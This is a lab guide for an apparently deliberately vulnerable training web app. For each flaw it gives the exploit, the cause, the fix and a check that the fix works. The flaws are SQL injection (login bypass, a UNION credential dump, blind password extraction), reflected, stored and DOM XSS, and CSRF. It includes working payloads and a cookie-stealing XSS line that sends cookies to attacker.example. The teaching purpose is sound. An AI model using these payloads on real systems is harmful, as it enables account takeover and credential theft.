# Payloads, Reproduction & Fixes

Every vulnerability below is reproduced step by step. For each one:

- **Exploit** — exact steps/payload that work against `MODE=vulnerable`.
- **Why it works** — the specific coding mistake.
- **Fix** — what the `MODE=safe` build does instead, and the file/line to point to.
- **Verify fixed** — the same payload failing against `MODE=safe`.

Start the vulnerable build with `npm run initdb && npm run vuln` (→ http://localhost:3000).
Reset with `npm run initdb` between runs so data (comments, emails) starts clean.

> Record evidence as **screenshots and short screen recordings of the live app**:
> the alert box firing, the credentials appearing in the results table, the email
> field changing on its own. Show the browser URL/address bar and the page, not
> log files.

---

## 1. SQL Injection — Level 1 (Easy): authentication bypass

**File:** `src/routes/auth.js` (the `POST /login` handler)

### Exploit
On the login page, submit:

- **Username:** `' OR 1=1 -- ` (note the trailing space after `--`)
- **Password:** anything, e.g. `x`

You are logged in as `alice` with no valid credentials.

### Why it works
The vulnerable query is built by string concatenation:

```js
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

Your input turns it into:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'x'
```

`OR 1=1` matches every row; `--` comments out the rest (the password check). The
query returns the first user, so the app logs you in.

To log in as a **specific** user (e.g. the admin):

- **Username:** `admin' -- `

### Fix (safe build)
A prepared statement with bound parameters:

```js
db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password);
```

The `?` placeholders are sent to SQLite separately from the data, so input is only
ever compared as a literal string — it can never become SQL.

### Verify fixed
Run `npm run safe`. The same `' OR 1=1 -- ` input now returns
**“Invalid username or password.”**

---

## 2. SQL Injection — Level 2 (Medium): UNION-based credential dump

**File:** `src/routes/search.js` (the `GET /search` handler)

### Exploit
Visit (or type into the search box):

```
/search?q=' UNION SELECT username, password, email, role FROM users -- 
```

The results table now lists every user’s **username, password, email and role**,
including `admin / SuperSecretAdminPass!`.

### Why it works
The vulnerable query:

```js
const sql = `SELECT code, title, description, instructor FROM courses WHERE title LIKE '%${q}%'`;
```

becomes:

```sql
SELECT code, title, description, instructor FROM courses
WHERE title LIKE '%' UNION SELECT username, password, email, role FROM users -- %'
```

The original `SELECT` has **four** columns, so a `UNION SELECT` with four columns
is valid and appends the `users` rows to the results the page renders. This is an
**in-band** injection: the stolen data comes straight back in the normal response.

> Teaching note: finding the column count is itself a standard step — e.g.
> `' ORDER BY 4 -- ` succeeds while `' ORDER BY 5 -- ` errors, revealing 4 columns.

### Fix (safe build)
Bind the search term as a parameter; it can never break out of the string literal:

```js
db.prepare('SELECT code, title, description, instructor FROM courses WHERE title LIKE ? OR code LIKE ?')
  .all(`%${q}%`, `%${q}%`);
```

### Verify fixed
Run `npm run safe`. The same payload returns **no rows** (it is searched for as the
literal text `' UNION SELECT ...`, which matches no course title).

---

## 3. SQL Injection — Level 3 (Hard): blind boolean on a numeric field

**File:** `src/routes/courses.js` (the `GET /:id` handler)

### Exploit
Course pages are at `/courses/<id>`. The id is numeric and concatenated in
**without quotes**, so there is “nothing to escape” — exactly the case people
forget to parameterise. The page gives a true/false oracle (course shown vs. 404):

```
/courses/3 and 1=1      ->  course is shown      (condition TRUE)
/courses/3 and 1=2      ->  "Course not found"   (condition FALSE)
```

Now extract data one character at a time, e.g. the admin password’s first char:

```
/courses/3 and substr((select password from users where username='admin'),1,1)='S'
```

- Page shown → that guess is correct. Page not found → wrong; try the next char.
- Walk the position (`,1,1` → `,2,1` → …) and the guessed character to recover the
  whole value. (You can confirm length first with
  `/courses/3 and length((select password from users where username='admin'))=21`.)

This is a **blind** injection: no data is echoed back; you infer it from the
app’s yes/no behaviour.

### Why it works
```js
const sql = `SELECT * FROM courses WHERE id = ${req.params.id}`;
```

Because the value is numeric, there are no quotes to break out of — the attacker
just appends SQL directly (`... WHERE id = 3 and 1=1`).

### Fix (safe build)
Validate that the id really is an integer, then bind it:

```js
const id = Number.parseInt(req.params.id, 10);
if (!Number.isInteger(id) || String(id) !== req.params.id) return res.status(404)...
db.prepare('SELECT * FROM courses WHERE id = ?').get(id);
```

Anything that is not a clean integer is rejected before a query is ever built.

### Verify fixed
Run `npm run safe`. `/courses/3 and 1=1` returns **404** (the id is not a valid
integer and is refused), so the oracle is gone.

---

## 4. Reflected XSS

**File:** `src/routes/search.js` + `src/views/search.ejs`

### Exploit
Visit:

```
/search?q=<script>alert(document.cookie)</script>
```

The script runs immediately — this is the payload an attacker would put in a link
and send to a victim (the script is “reflected” off the request into the response).

A less noisy proof that also works where `<script>` is filtered:

```
/search?q=<img src=x onerror=alert('reflected-xss')>
```

### Why it works
The vulnerable template prints the query term as raw HTML:

```ejs
<strong><%- q %></strong>   <%# <%- is EJS "unescaped output" %>
```

so the `<script>` becomes part of the page’s markup and executes.

### Fix (safe build)
Escape on output using EJS’s default-escaping tag:

```ejs
<strong><%= q %></strong>   <%# <%= HTML-escapes: < becomes &lt; etc. %>
```

Plus a **Content-Security-Policy** header (`script-src 'self'`) set in
`server.js`, which tells the browser to refuse inline/injected scripts even if
some markup slipped through — defence-in-depth.

### Verify fixed
Run `npm run safe`. The payload is displayed as the literal text
`<script>alert(document.cookie)</script>` and nothing executes.

---

## 5. Stored (Persistent) XSS

**File:** `src/routes/courses.js` + `src/views/course.ejs`

### Exploit
1. Open any course, e.g. `/courses/1`.
2. In the comment box, post:

   ```html
   <script>alert('stored-xss by '+document.domain)</script>
   ```

3. The alert fires now — and **again every time anyone opens that course page**,
   because the payload is saved in the database and served to all visitors.

A cookie-stealing style payload (what a real attacker would use):

```html
<img src=x onerror="new Image().src='http://attacker.example/c?'+document.cookie">
```

### Why it works
The comment body is stored verbatim (realistic — storage is not the bug) and the
vulnerable template renders it as raw HTML:

```ejs
<div class="comment-body"><%- cm.body %></div>
```

So stored markup executes for every viewer. Stored XSS is more dangerous than
reflected because no social engineering is needed — victims just view a normal
page.

### Fix (safe build)
Escape on output:

```ejs
<div class="comment-body"><%= cm.body %></div>
```

The stored text is shown as literal characters. (CSP again is the second layer.)
Note the fix is at **output**, not storage — the same stored row is now harmless.

### Verify fixed
Run `npm run safe` (reseed first to clear the old comment). The comment is
displayed as text; no alert fires.

---

## 6. DOM-based XSS

**File:** `public/js/dom-vuln.js` (vulnerable) / `public/js/dom-safe.js` (safe),
wired in `src/views/search.ejs`.

### Exploit
On the search page there is a “Quick preview” box that displays whatever follows
`#` in the URL. Visit:

```
/search#<img src=x onerror=alert('dom-xss')>
```

The script runs. Crucially, everything after `#` (the *fragment*) **is never sent
to the server** — the vulnerability is entirely in client-side JavaScript. That is
what makes it *DOM-based*: server-side escaping alone cannot fix it.

### Why it works
The vulnerable script takes an attacker-controlled **source** (`location.hash`)
and writes it to a dangerous **sink** (`innerHTML`), which parses it as HTML:

```js
box.innerHTML = decodeURIComponent(location.hash.slice(1)); // dangerous sink
```

### Fix (safe build)
Write to a safe sink that never parses HTML:

```js
box.textContent = decodeURIComponent(location.hash.slice(1)); // safe sink
```

The same payload now appears as literal text. (If HTML really had to be rendered,
you would sanitise with a vetted library such as DOMPurify; here text is all we
need.) CSP is again a second layer.

### Verify fixed
Run `npm run safe`. `/search#<img src=x onerror=alert('dom-xss')>` shows the text
and does not execute.

---

## 7. CSRF — forged email change (account takeover primitive)

**File:** `src/routes/profile.js` + `attacker/csrf.html`

### Exploit
1. Start the vulnerable build and log in normally as `alice` (`password123`).
   Check your email on `/profile`.
2. In a **different** origin, serve the attacker page:

   ```bash
   cd attacker
   python3 -m http.server 4000
   ```

3. In the **same browser** (still logged in to SecureLearn), open
   `http://localhost:4000/csrf.html`.
4. The page auto-submits a hidden form to `POST http://localhost:3000/profile/email`.
   Reload `/profile`: your email is now `attacker@evil.example` — changed with no
   action from you.

Why that matters: owning the account’s email means the attacker can trigger a
password reset and take over the account.

### Why it works
Two problems in the vulnerable build:

- The `POST /profile/email` handler has **no anti-CSRF token**, so it cannot tell a
  genuine form submission from a forged cross-site one.
- The session cookie is sent on cross-site requests (`SameSite=None`), so the
  victim’s browser attaches it to the attacker’s forged request automatically.

### Fix (safe build)
- A per-session **synchroniser token** (`src/security.js`): a random value stored
  in the session and embedded as a hidden `_csrf` field in every form. The server
  verifies it with a constant-time compare on every state-changing POST. A
  cross-site page **cannot read** the victim’s token, so it cannot forge a valid
  request → `403 Invalid CSRF token`.
- The session cookie is set to **`SameSite=Lax`** (in `server.js`) as a second
  layer, which by itself blocks the cross-site POST.

### Verify fixed
Run `npm run safe`, log in, and open the same `attacker/csrf.html`. The forged
request is rejected with **403** and the email is unchanged.

---

## Automated verification (optional, for your own confidence)

A single script can start each build and fire all of the payloads above,
asserting each one **works** under `vulnerable` and is **blocked** under `safe`.
The approach (using `curl` with a cookie jar):

- SQLi L1: `POST /login` with `username=' OR 1=1 -- ` → vulnerable logs in; safe rejects.
- SQLi L2: `GET /search?q=' UNION SELECT ...` → vulnerable leaks `SuperSecretAdminPass!`; safe does not.
- SQLi L3: `GET /courses/3 and 1=1` (200) vs `/courses/3 and 1=2` (404) → oracle present in vulnerable, both 404 in safe.
- Reflected XSS: `GET /search?q=<script>...` → raw tag in vulnerable; `&lt;script&gt;` in safe.
- Stored XSS: post a `<script>` comment then `GET /courses/1` → raw in vulnerable; escaped in safe.
- DOM XSS: assert the page loads `dom-vuln.js` (innerHTML) vs `dom-safe.js` (textContent).
- CSRF: `POST /profile/email` with only the session cookie, no token → succeeds in vulnerable; `403` in safe.

Running that end to end, every assertion passes: 21/21.
